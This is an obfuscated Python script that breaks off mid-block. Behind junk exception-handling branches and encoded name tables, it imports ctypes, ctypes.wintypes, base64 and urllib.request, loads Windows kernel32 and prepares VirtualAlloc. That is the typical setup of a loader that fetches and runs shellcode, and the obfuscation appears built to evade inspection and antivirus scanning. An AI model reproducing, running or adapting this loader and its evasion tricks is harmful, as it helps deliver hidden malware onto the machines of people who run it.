__5554178880572 = 0
__5554178880572 += 1
try:
    raise MemoryError(__5554178880572)
except MemoryError as __5998947662770:
    if __5998947662770.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(819) > int(71) < int(517) > int(1110))) and bool(str(str(1217) > int(185) < int(153) > int(1611))) > 2 else bool
    if __5998947662770.args[0] == 3:
        __6738249450043 = 117178257802317
    if __5998947662770.args[0] == 4:
        __5497251144388 = 267470825326030
__4228829518420 = 0
__4228829518420 += 1
try:
    raise MemoryError(__4228829518420)
except MemoryError as __4068293384563:
    if __4068293384563.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(84) > int(153) < int(1318) > int(515))) and bool(str(str(23) > int(134) < int(1612) > int(1112))) > 2 else str
    if __4068293384563.args[0] == 3:
        __3871359767570 = 7021173047262
    if __4068293384563.args[0] == 4:
        __7451413632924 = 69365510849173
    if __4068293384563.args[0] == 5:
        __7700438851976 = 186371547406934
    if __4068293384563.args[0] == 6:
        __3170249610221 = 232226207304152
    if __4068293384563.args[0] == 7:
        __8099913358159 = 66316883846663
__4000369231831 = 0
__4000369231831 += 1
try:
    raise MemoryError(__4000369231831)
except MemoryError as __4325898758914:
    if __4325898758914.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(1916) > int(318) < int(1114) > int(133))) and bool(str(str(158) > int(710) < int(1913) > int(98))) > 2 else type
    if __4325898758914.args[0] == 3:
        __3252301111253 = 80193413446044
    if __4325898758914.args[0] == 4:
        __4651265054419 = 226111056972227
    if __4325898758914.args[0] == 5:
        __7841760297134 = 217697022440502
__5270815163457 = 0
__5270815163457 += 1
try:
    raise MemoryError(__5270815163457)
except MemoryError as __2384665190415:
    if __2384665190415.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(39) > int(156) < int(116) > int(113))) and bool(str(str(127) > int(219) < int(1910) > int(910))) > 2 else int
    if __2384665190415.args[0] == 3:
        __7294586187705 = 165608010777036
    if __2384665190415.args[0] == 4:
        __2119126012247 = 232860090005357
__8551502815909 = 0
__8551502815909 += 1
try:
    raise MemoryError(__8551502815909)
except MemoryError as __8007641323196:
    if __8007641323196.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(18) > int(95) < int(615) > int(145))) and bool(str(str(212) > int(913) < int(124) > int(1618))) > 2 else bytes
    if __8007641323196.args[0] == 3:
        __4755125592400 = 135753655644699
    if __8007641323196.args[0] == 4:
        __3444444428651 = 48600569248555
    if __8007641323196.args[0] == 5:
        __8262225013983 = 62883242780352
__3311798645919 = 0
__3311798645919 += 1
try:
    raise MemoryError(__3311798645919)
except MemoryError as __8050215797587:
    if __8050215797587.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(194) > int(176) < int(64) > int(1918))) and bool(str(str(31) > int(1914) < int(104) > int(110))) > 2 else vars
    if __8050215797587.args[0] == 3:
        __6694153693392 = 184170913144013
__3623320536947 = 0
__3623320536947 += 1
try:
    raise MemoryError(__3623320536947)
except MemoryError as __3977475148814:
    if __3977475148814.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(139) > int(814) < int(1318) > int(416))) and bool(str(str(78) > int(1516) < int(16) > int(1117))) > 2 else callable
    if __3977475148814.args[0] == 3:
        __7539745983863 = 196317745583340
    if __3977475148814.args[0] == 4:
        __2659295540136 = 107266864214392
__3251325691594 = 0
__3251325691594 += 1
try:
    raise MemoryError(__3251325691594)
except MemoryError as __5194559428590:
    if __5194559428590.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(92) > int(1016) < int(185) > int(1319))) and bool(str(str(1315) > int(911) < int(136) > int(1612))) > 2 else eval
    if __5194559428590.args[0] == 3:
        __7721638734464 = 110049333794813
    if __5194559428590.args[0] == 4:
        __8197416914973 = 262842333533185
    if __5194559428590.args[0] == 5:
        __5668855947592 = 176083997156761
    if __5194559428590.args[0] == 6:
        __5753725166255 = 40590442804223
    if __5194559428590.args[0] == 7:
        __6472909618429 = 234485735588038
__6137685046751 = 0
__6137685046751 += 1
try:
    raise MemoryError(__6137685046751)
except MemoryError as __2273006715910:
    if __2273006715910.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(93) > int(115) < int(1711) > int(81))) and bool(str(str(1913) > int(107) < int(185) > int(189))) > 2 else list
    if __2273006715910.args[0] == 3:
        __4527876742723 = 52986944896492
    if __2273006715910.args[0] == 4:
        __7738776868324 = 260020324515034
    if __2273006715910.args[0] == 5:
        __7052423084195 = 54257406020025
__8187069862901 = 0
__8187069862901 += 1
try:
    raise MemoryError(__8187069862901)
except MemoryError as __3936470560253:
    if __3936470560253.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(14) > int(515) < int(42) > int(413))) and bool(str(str(68) > int(1218) < int(196) > int(318))) > 2 else map
    if __3936470560253.args[0] == 3:
        __5825982791715 = 275918801172453
    if __3936470560253.args[0] == 4:
        __7717960966810 = 126367555028133
    if __3936470560253.args[0] == 5:
        __3270554000823 = 167847610239413
    if __3936470560253.args[0] == 6:
        __5417626621944 = 51689398418673
    if __3936470560253.args[0] == 7:
        __4805339822638 = 231020613540068
__8335964738893 = 0
__8335964738893 += 1
try:
    raise MemoryError(__8335964738893)
except MemoryError as __7523367052314:
    if __7523367052314.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(169) > int(51) < int(1913) > int(513))) and bool(str(str(518) > int(1011) < int(65) > int(129))) > 2 else __import__
    if __7523367052314.args[0] == 3:
        __6797104800429 = 107791418469387
    if __7523367052314.args[0] == 4:
        __2634108902706 = 15261118134745
__3134736046689 = 0
__3134736046689 += 1
try:
    raise MemoryError(__3134736046689)
except MemoryError as __8047974574727:
    if __8047974574727.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(116) > int(26) < int(85) > int(177))) and bool(str(str(1512) > int(917) < int(415) > int(144))) > 2 else print
    if __8047974574727.args[0] == 3:
        __5902939270425 = 266527817839019
    if __8047974574727.args[0] == 4:
        __2452439310284 = 23277913433618
__4079439412331 = 0
__4079439412331 += 1
try:
    raise MemoryError(__4079439412331)
except MemoryError as __6115798020712:
    if __6115798020712.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(56) > int(165) < int(712) > int(198))) and bool(str(str(89) > int(1110) < int(810) > int(1417))) > 2 else input
    if __6115798020712.args[0] == 3:
        __6596004478426 = 85623871722238

def R_E_D__A_V____(RED_DEFENDER, *k):
    __6201575807926 = 0
    __6201575807926 += 1
    try:
        raise MemoryError(__6201575807926)
    except MemoryError as __3698099427411:
        if __3698099427411.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __3698099427411.args[0] == 1:
            globals()['_177'] = (lambda : (lambda _1517: _1517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __3698099427411.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __3698099427411.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __3698099427411.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __3698099427411.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _177:
                    globals()['R_E_D____A_V_'] += (lambda : '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda : (lambda _199: _199 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __3698099427411.args[0] == 1:
            return R_E_D____A_V
        if __3698099427411.args[0] == 9:
            __4362685832023 = 229961408557908

def ______R_E_D__A_V_______(x):
    __5606499394003 = 0
    __5606499394003 += 1
    try:
        raise MemoryError(__5606499394003)
    except MemoryError as __7121779622869:
        if __7121779622869.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __7121779622869.args[0] == 3:
            __7557377126947 = 145714243082757
        if __7121779622869.args[0] == 4:
            __6786230744296 = 173650421441280
        if __7121779622869.args[0] == 5:
            __5103604996899 = 106105599255465

def R_E_D__A_V(e):
    __4593440323776 = 0
    __4593440323776 += 1
    try:
        raise MemoryError(__4593440323776)
    except MemoryError as __2281033453666:
        if __2281033453666.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __2281033453666.args[0] == 1:
            r = 0
        if __2281033453666.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __2281033453666.args[0] == 1:
            return r
        if __2281033453666.args[0] == 6:
            __6352767655913 = 1188954010921
        if __2281033453666.args[0] == 7:
            __6447853801413 = 35735221739076
        if __2281033453666.args[0] == 8:
            __5276844746957 = 156223773813889

def ____________________________(x):
    __2511957220290 = 0
    __2511957220290 += 1
    try:
        raise MemoryError(__2511957220290)
    except MemoryError as __3857229056031:
        if __3857229056031.args[0] == 1:
            ar = []
        if __3857229056031.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __3857229056031.args[0] == 1:
            return ar
        if __3857229056031.args[0] == 5:
            __5657832162202 = 38911954708413
        if __3857229056031.args[0] == 6:
            __2673842785955 = 115895153303235
if (lambda : (lambda _85: _85 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '126' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _318 = [[True], [False]]
            R_E_D__A_V______(['_56'])
    raise MemoryError([True])
except MemoryError as _181:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1911: _1911 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _56 = [[(lambda : (lambda _69: _69 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _198: _198 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _24: _24 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _36:
        import sys
try:
    match '179' == '169':
        case True:
            raise MemoryError([True])
        case False:
            _1710 = [[True], [False]]
            R_E_D__A_V______(['_115'])
    raise MemoryError([True])
except MemoryError as _1710:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1812: _1812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _52 = [[(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _116: _116 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _153: _153 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _117:
        import ctypes
try:
    match '98' == '717':
        case True:
            raise MemoryError([True])
        case False:
            _415 = [[True], [False]]
            R_E_D__A_V______(['_27'])
    raise MemoryError([True])
except MemoryError as _75:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _132: _132 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1213 = [[(lambda : (lambda _181: _181 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _316: _316 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _1915: _1915 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _176:
        import base64
try:
    match '146' == '68':
        case True:
            raise MemoryError([True])
        case False:
            _117 = [[True], [False]]
            R_E_D__A_V______(['_1812'])
    raise MemoryError([True])
except MemoryError as _1115:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _176: _176 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _182 = [[(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _514: _514 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _71: _71 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1811:
        import ctypes.wintypes as wt
try:
    match '1714' == '24':
        case True:
            raise MemoryError([True])
        case False:
            _58 = [[True], [False]]
            R_E_D__A_V______(['_104'])
    raise MemoryError([True])
except MemoryError as _911:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1516: _1516 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1713 = [[(lambda : (lambda _1815: _1815 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1816: _1816 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _109: _109 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _191:
        import urllib.request
try:
    match '98' == '23':
        case True:
            raise MemoryError([True])
        case False:
            _1714 = [[True], [False]]
            R_E_D__A_V______(['_165'])
    raise MemoryError([True])
except MemoryError as _96:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1218: _1218 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1718 = [[(lambda : (lambda _177: _177 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _118: _118 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1816: _1816 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _518:
        __7743312912270 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1214' == '512':
        case True:
            raise MemoryError([True])
        case False:
            _716 = [[True], [False]]
            R_E_D__A_V______(['_716'])
    raise MemoryError([True])
except MemoryError as _84:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1910: _1910 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _158 = [[(lambda : (lambda _25: _25 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1011: _1011 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1518: _1518 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _913:
        __7743312912270 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '917' == '131':
        case True:
            raise MemoryError([True])
        case False:
            _1317 = [[True], [False]]
            R_E_D__A_V______(['_1412'])
    raise MemoryError([True])
except MemoryError as _1319:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1215: _1215 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _174 = [[(lambda : (lambda _177: _177 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _914: _914 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1710: _1710 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _102:
        try:
            raise MemoryError(__7743312912270)
        except MemoryError as __2605331704985:
            if __2605331704985.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __2605331704985.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2421041629104 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x1d\xa9^/r\xa3'))()
            if __2605331704985.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6084822714344 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x92\x03E\xb4\xad&'))()
try:
    match '156' == '1613':
        case True:
            raise MemoryError([True])
        case False:
            _1315 = [[True], [False]]
            R_E_D__A_V______(['_24'])
    raise MemoryError([True])
except MemoryError as _116:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _186: _186 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _156 = [[(lambda : (lambda _316: _316 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _196: _196 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _19: _19 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _98:
        __7340010094462 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '126' == '159':
        case True:
            raise MemoryError([True])
        case False:
            _512 = [[True], [False]]
            R_E_D__A_V______(['_1110'])
    raise MemoryError([True])
except MemoryError as _314:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _613: _613 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _161 = [[(lambda : (lambda _179: _179 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _811: _811 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _17: _17 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _65:
        __7340010094462 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1314' == '196':
        case True:
            raise MemoryError([True])
        case False:
            _101 = [[True], [False]]
            R_E_D__A_V______(['_172'])
    raise MemoryError([True])
except MemoryError as _1213:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _45: _45 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _123 = [[(lambda : (lambda _1416: _1416 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _118: _118 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _67: _67 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _310:
        try:
            raise MemoryError(__7340010094462)
        except MemoryError as __5296967723478:
            if __5296967723478.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __5296967723478.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3045080780500 = (lambda : R_E_D__A_V(b'R_E_D__A_V__d\xbf]2OG'))()
            if __5296967723478.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4590715330758 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x83\xd0,6\x13\xb1'))()
            if __5296967723478.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4539623816124 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf1\x0c\x0f\xe2\xfe\xfb'))()
try:
    match '1817' == '52':
        case True:
            raise MemoryError([True])
        case False:
            _1815 = [[True], [False]]
            R_E_D__A_V______(['_17'])
    raise MemoryError([True])
except MemoryError as _619:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1319: _1319 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _813 = [[(lambda : (lambda _58: _58 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1316: _1316 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _172: _172 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _618:
        __6117676304364 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1611' == '37':
        case True:
            raise MemoryError([True])
        case False:
            _817 = [[True], [False]]
            R_E_D__A_V______(['_1611'])
    raise MemoryError([True])
except MemoryError as _317:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _142: _142 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _107 = [[(lambda : (lambda _13: _13 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1718: _1718 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _1210: _1210 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _111:
        __6117676304364 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '52' == '614':
        case True:
            raise MemoryError([True])
        case False:
            _53 = [[True], [False]]
            R_E_D__A_V______(['_1814'])
    raise MemoryError([True])
except MemoryError as _93:
    try:
